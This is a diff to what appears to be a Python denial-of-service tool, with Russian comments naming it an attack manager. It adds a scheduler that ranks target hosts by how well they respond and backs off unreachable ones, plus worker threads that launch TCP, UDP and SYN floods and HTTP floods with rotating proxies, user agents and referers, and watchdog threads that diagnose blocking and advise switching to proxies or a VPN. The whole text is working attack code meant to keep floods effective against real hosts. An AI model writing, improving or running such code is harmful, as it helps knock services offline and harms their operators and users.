+            kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
+            if pool == self.POOL_HEALTHY:
+                counts["healthy"] += 1
+            elif pool == self.POOL_DISCOVERY:
+                counts["discovery"] += 1
+            elif pool == self.POOL_COOLDOWN_PROBE and in_backoff:
+                if kind in (ERROR_KIND_REFUSED, ERROR_KIND_DNS):
+                    counts["closed"] += 1
+                else:
+                    counts["cooldown"] += 1
+            elif kind in HARD_COOLDOWN_KINDS:
+                counts["closed"] += 1
+            elif pool == self.POOL_DEGRADED:
+                counts["degraded"] += 1
+            else:
+                counts["cooldown"] += 1
+        return counts
+
+    def count_ready(self, snapshot: Dict[str, Dict[str, object]], now: float) -> int:
+        ready = 0
+        for job in self.jobs:
+            if self._backoff_until.get(job.target_key, 0) <= now:
+                ready += 1
+        return ready
+
+    def derive_diagnosis(
+        self,
+        pools: Dict[str, int],
+        *,
+        proxy_mode: str,
+        useful_bytes: int,
+        ready_count: int,
+    ) -> str:
+        total = len(self.jobs)
+        if total == 0:
+            return "no_targets"
+        if pools["healthy"] > 0 and useful_bytes > 0:
+            return "healthy"
+        if pools["healthy"] == 0 and pools["closed"] >= max(1, total // 2):
+            return "targets_mostly_closed"
+        if proxy_mode == "proxy" and pools["healthy"] == 0 and pools["cooldown"] + pools["closed"] > 0:
+            return "proxy_failure"
+        if pools["degraded"] + pools["discovery"] > pools["closed"] and pools["healthy"] == 0:
+            return "egress_blocked"
+        if ready_count == 0:
+            return "capacity_idle"
+        if pools["healthy"] > 0 and useful_bytes == 0:
+            return "insufficient_reachable"
+        return "low_traffic_mixed"
+
+    def pick_next(self) -> Optional[TargetJob]:
+        now = time.time()
+        snapshot = self.target_health.snapshot()
+        self._pick_counter += 1
+        # Reserve probe turns so small thread budgets do not hammer closed/backoff targets every pick.
+        probe_budget = max(10, self.worker_count // 5)
+        allow_probe = (self._pick_counter % probe_budget) == 0
+        allow_discovery = (self._pick_counter % 3) == 0
+        recovery_probe_budget = max(12, self.worker_count * 2)
+        allow_recovery_probe = (self._pick_counter % recovery_probe_budget) == 0
+
+        with self._lock:
+            buckets: Dict[int, List[TargetJob]] = {
+                self.POOL_HEALTHY: [],
+                self.POOL_DISCOVERY: [],
+                self.POOL_DEGRADED: [],
+                self.POOL_COOLDOWN_PROBE: [],
+            }
+            for job in self.jobs:
+                key = job.target_key
+                backoff_until = self._backoff_until.get(key, 0)
+                in_backoff = backoff_until > now
+                if in_backoff and not allow_probe:
+                    continue
+                entry = snapshot.get(key, {})
+                pool = self._pool_for_entry(key, entry, now, in_backoff)
+                if pool == self.POOL_COOLDOWN_PROBE and in_backoff and not allow_probe:
+                    continue
+                buckets[pool].append(job)
+
+            discovery = buckets.get(self.POOL_DISCOVERY) or []
+            if discovery and (allow_discovery or not buckets.get(self.POOL_HEALTHY)):
+                return self._pick_round_robin(discovery)
+
+            if allow_recovery_probe:
+                recovery_candidates: List[TargetJob] = []
+                for job in self.jobs:
+                    key = job.target_key
+                    entry = snapshot.get(key, {})
+                    kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
+                    if kind not in HARD_COOLDOWN_KINDS:
+                        continue
+                    successes = int(entry.get("successes", 0))
+                    attempts = int(entry.get("attempts", 0))
+                    if successes > 0:
+                        if self._is_currently_healthy(key, entry, snapshot):
+                            continue
+                    elif attempts < DISCOVERY_ATTEMPTS_PER_TARGET:
+                        continue
+                    recovery_candidates.append(job)
+                if recovery_candidates:
+                    return self._pick_round_robin(recovery_candidates, probe=True)
+
+            for pool_rank in (
+                self.POOL_HEALTHY,
+                self.POOL_DEGRADED,
+                self.POOL_DISCOVERY,
+                self.POOL_COOLDOWN_PROBE,
+            ):
+                group = buckets.get(pool_rank) or []
+                if not group:
+                    continue
+                if pool_rank == self.POOL_COOLDOWN_PROBE:
+                    job = self._pick_round_robin(group, probe=True)
+                else:
+                    job = self._pick_round_robin(group)
+                return job
+            return None
+
+    def _backoff_delay(self, key: str, snapshot: Dict[str, Dict[str, object]], streak: int) -> float:
+        entry = snapshot.get(key, {})
+        kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
+        if kind in HARD_COOLDOWN_KINDS:
+            exponent = min(max(0, streak - self.HARD_BACKOFF_AFTER_ATTEMPTS), 3)
+            return min(
+                self.HARD_BACKOFF_MAX_SEC,
+                self.HARD_BACKOFF_BASE_SEC * (2 ** exponent),
+            )
+        exponent = min(max(0, streak - self.BACKOFF_AFTER_ATTEMPTS), 4)
+        return min(self.BACKOFF_MAX_SEC, self.BACKOFF_BASE_SEC * (2 ** exponent))
+
+    def note_result(self, job: TargetJob, had_success: bool) -> None:
+        if had_success:
+            with self._lock:
+                self._backoff_until.pop(job.target_key, None)
+            return
+
+        snapshot = self.target_health.snapshot()
+        streak = self._failure_streak(job.target_key, snapshot)
+        entry = snapshot.get(job.target_key, {})
+        kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
+        threshold = (
+            self.HARD_BACKOFF_AFTER_ATTEMPTS
+            if kind in HARD_COOLDOWN_KINDS
+            else self.BACKOFF_AFTER_ATTEMPTS
+        )
+        if streak < threshold:
+            return
+
+        delay = self._backoff_delay(job.target_key, snapshot, streak)
+        with self._lock:
+            self._backoff_until[job.target_key] = time.time() + delay
+
+
+class FloodWorker(threading.Thread):
+    def __init__(
+        self,
+        worker_id: int,
+        scheduler: TargetScheduler,
+        event: threading.Event,
+        stats_dict: dict,
+        stats_lock: threading.Lock,
+        target_health: TargetHealth
+    ):
+        super().__init__(daemon=True)
+        self.worker_id = worker_id
+        self.scheduler = scheduler
+        self.event = event
+        self.stats_dict = stats_dict
+        self.stats_lock = stats_lock
+        self.target_health = target_health
+
+    def _success_count(self, key: str) -> int:
+        snapshot = self.target_health.snapshot()
+        entry = snapshot.get(key, {})
+        return int(entry.get("successes", 0))
+
+    def _execute_job(self, job: TargetJob) -> None:
+        if job.method in ("TCP", "UDP", "SYN"):
+            layer4 = Layer4(
+                job.layer4_addr,
+                job.method,
+                None,
+                job.target_key,
+                self.stats_dict,
+                self.stats_lock,
+                self.target_health,
+                burst_limit=LAYER4_BURST_SENDS
+            )
+            layer4.select(job.method)
+            layer4.SENT_FLOOD()
+            return
+
+        http = HttpFlood(
+            self.worker_id,
+            job.url,
+            job.host,
+            job.method,
+            job.rpc,
+            None,
+            job.useragents,
+            job.referers,
+            job.proxies,
+            job.target_key,
+            self.stats_dict,
+            self.stats_lock,
+            self.target_health
+        )
+        http.select(job.method)
+        http.SENT_FLOOD()
+
+    def run(self):
+        self.event.wait()
+        while self.event.is_set():
+            job = self.scheduler.pick_next()
+            if job is None:
+                time.sleep(0.05)
+                continue
+
+            before = self._success_count(job.target_key)
+            self._execute_job(job)
+            after = self._success_count(job.target_key)
+            self.scheduler.note_result(job, after > before)
+
 # ----------------------------------------------------------------------
 # Менеджер атак
 # ----------------------------------------------------------------------
@@ -486,12 +1335,20 @@ class AttackManager:
         self.event = threading.Event()
         self.threads: List[threading.Thread] = []
         self.monitor_thread = None
+        self.health_thread = None
+        self.capacity_thread = None
+        self.worker_count = 0
         self.target_stats: Dict[str, List[int]] = {}
         self.stats_lock = threading.Lock()
+        self.target_health = TargetHealth()
         self._proxy_list: Optional[List[Proxy]] = None
         self._proxies_loaded = False
         self.target_keys: List[str] = []
+        self.resolved_targets: List[str] = []
         self.table_height = 0
+        self.proxy_mode = "direct"
+        self.scheduler: Optional[TargetScheduler] = None
+        self.target_jobs: List[TargetJob] = []
 
     def _load_proxies_if_needed(self, proxy_enabled: int, check_url: str) -> Optional[List[Proxy]]:
         if proxy_enabled == 0:
@@ -501,14 +1358,16 @@ class AttackManager:
             self._proxies_loaded = True
         return self._proxy_list
 
-    def _spawn_threads(self):
-        self.threads.clear()
-        target_keys = []
+    def _build_target_jobs(self) -> Tuple[List[TargetJob], List[str], List[str], int]:
+        jobs: List[TargetJob] = []
+        target_keys: List[str] = []
+        resolved_targets: List[str] = []
 
         settings = self.config.get("settings", {})
-        default_threads = settings.get("threads", 100)
+        worker_budget = max(1, min(int(settings.get("threads", 100)), MAX_WORKER_THREADS))
         default_rpc = settings.get("rpc", 1)
         default_proxy = settings.get("proxy", 0)
+        self.proxy_mode = "proxy" if int(default_proxy) > 0 else "direct"
 
         ua_list = set(self.config.get("useragents", []))
         if not ua_list:
@@ -521,8 +1380,6 @@ class AttackManager:
             method = target["method"].upper()
             target_str = target["target"]
             ip = target.get("ip")
-
-            threads = target.get("threads", default_threads)
             rpc = target.get("rpc", default_rpc)
             proxy_enabled = target.get("proxy", default_proxy)
 
@@ -536,34 +1393,82 @@ class AttackManager:
                 else:
                     ip_part, port_part = rest, "80"
                 port = int(port_part)
-                actual_ip = ip if ip else socket.gethostbyname(ip_part)
+                try:
+                    actual_ip = ip if ip else socket.gethostbyname(ip_part)
+                except socket.gaierror as exc:
+                    logger.warning(
+                        "Skipping unresolvable target %s: %s",
+                        mask_target_label(target_str),
+                        exc,
+                    )
+                    continue
                 key = f"{actual_ip}:{port}"
                 target_keys.append(key)
-                for _ in range(threads):
-                    t = Layer4((actual_ip, port), method, self.event,
-                               target_key=key, stats_dict=self.target_stats, stats_lock=self.stats_lock)
-                    self.threads.append(t)
+                resolved_targets.append(f"{method} {actual_ip}:{port}")
+                jobs.append(TargetJob(
+                    method=method,
+                    target_key=key,
+                    layer4_addr=(actual_ip, port),
+                    useragents=ua_list,
+                    referers=ref_list
+                ))
             else:
                 url = URL(target_str)
                 hostname = url.host
-                actual_ip = ip if ip else socket.gethostbyname(hostname)
-                key = url.host
+                try:
+                    actual_ip = ip if ip else socket.gethostbyname(hostname)
+                except socket.gaierror as exc:
+                    logger.warning(
+                        "Skipping unresolvable target %s: %s",
+                        mask_target_label(target_str),
+                        exc,
+                    )
+                    continue
+                port = url.port or (443 if url.scheme.lower() == "https" else 80)
+                key = f"{hostname}:{port}"
                 target_keys.append(key)
+                resolved_targets.append(f"{method} {hostname}:{port}")
                 proxies = self._load_proxies_if_needed(proxy_enabled, str(url))
-                for thread_id in range(threads):
-                    t = HttpFlood(thread_id, url, actual_ip, method, rpc,
-                                  self.event, ua_list, ref_list,
-                                  set(proxies) if proxies else None,
-                                  target_key=key, stats_dict=self.target_stats, stats_lock=self.stats_lock)
-                    self.threads.append(t)
+                jobs.append(TargetJob(
+                    method=method,
+                    target_key=key,
+                    url=url,
+                    host=actual_ip,
+                    rpc=rpc,
+                    proxies=set(proxies) if proxies else None,
+                    useragents=ua_list,
+                    referers=ref_list
+                ))
 
         seen = set()
-        unique_keys = []
-        for k in target_keys:
-            if k not in seen:
-                seen.add(k)
-                unique_keys.append(k)
-        return unique_keys
+        unique_keys: List[str] = []
+        for key in target_keys:
+            if key not in seen:
+                seen.add(key)
+                unique_keys.append(key)
+
+        return jobs, unique_keys, resolved_targets, worker_budget
+
+    def _spawn_workers(self, jobs: List[TargetJob], worker_budget: int) -> None:
+        self.threads.clear()
+        if not jobs:
+            return
+
+        self.target_jobs = jobs
+        worker_count = max(1, min(worker_budget, MAX_WORKER_THREADS))
+        self.worker_count = worker_count
+        self.scheduler = TargetScheduler(jobs, self.target_health, worker_count)
+
+        for worker_id in range(worker_count):
+            worker = FloodWorker(
+                worker_id,
+                self.scheduler,
+                self.event,
+                self.target_stats,
+                self.stats_lock,
+                self.target_health
+            )
+            self.threads.append(worker)
 
     def _calculate_table_height(self):
         try:
@@ -579,7 +1484,12 @@ class AttackManager:
             logger.warning("Already running")
             return
 
-        self.target_keys = self._spawn_threads()
+        jobs, self.target_keys, self.resolved_targets, worker_budget = self._build_target_jobs()
+        self._spawn_workers(jobs, worker_budget)
+        if not self.threads:
+            logger.warning("No resolvable targets to launch.")
+            return
+
         self.table_height = self._calculate_table_height()
 
         sys.stdout.write("\033[2J\033[H")
@@ -590,7 +1500,40 @@ class AttackManager:
         with self.stats_lock:
             self.target_stats.clear()
 
-        logger.info(f"Launching {len(self.threads)} threads...")
+        if self.proxy_mode == "proxy" and not self._proxies_loaded:
+            probe_url = "http://httpbin.org/get"
+            for target in self.config.get("targets", []):
+                method = str(target.get("method", "")).upper()
+                if method not in ("TCP", "UDP", "SYN"):
+                    probe_url = str(target.get("target", probe_url))
+                    break
+            self._load_proxies_if_needed(1, probe_url)
+
+        for resolved in self.resolved_targets:
+            logger.info("Resolved target %s", mask_target_label(resolved))
+
+        if self.proxy_mode == "direct":
+            logger.info(
+                "Connectivity mode: direct (proxy disabled). "
+                "If targets time out, enable proxy/VPN or check firewall/routing."
+            )
+        else:
+            if self._proxy_list:
+                logger.info("Connectivity mode: proxy enabled (%s working proxies loaded)", len(self._proxy_list))
+            elif self._proxies_loaded:
+                logger.warning(
+                    "Connectivity mode: proxy enabled but no working proxies loaded; "
+                    "proxy pool exhausted — stop/start module to refresh or check network route"
+                )
+            else:
+                logger.info("Connectivity mode: proxy enabled (loading proxy providers...)")
+
+        logger.info(
+            "Launching %s worker threads for %s targets (global budget=%s)...",
+            len(self.threads),
+            len(jobs),
+            worker_budget
+        )
         for t in self.threads:
             t.start()
         self.event.set()
@@ -603,6 +1546,33 @@ class AttackManager:
             daemon=True
         )
         self.monitor_thread.start()
+
+        if self.health_thread and self.health_thread.is_alive():
+            self.health_thread.join(timeout=0.5)
+        self.health_thread = threading.Thread(
+            target=health_watchdog_loop,
+            args=(self.event, self.target_health, self.target_keys, self.proxy_mode),
+            daemon=True
+        )
+        self.health_thread.start()
+
+        if self.capacity_thread and self.capacity_thread.is_alive():
+            self.capacity_thread.join(timeout=0.5)
+        self.capacity_thread = threading.Thread(
+            target=capacity_health_loop,
+            args=(
+                self.event,
+                self.target_health,
+                self.target_keys,
+                self.target_stats,
+                self.stats_lock,
+                self.scheduler,
+                self.worker_count,
+                self.proxy_mode,
+            ),
+            daemon=True,
+        )
+        self.capacity_thread.start()
 
     def stop(self):
         if not self.event.is_set():
@@ -670,3 +1640,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
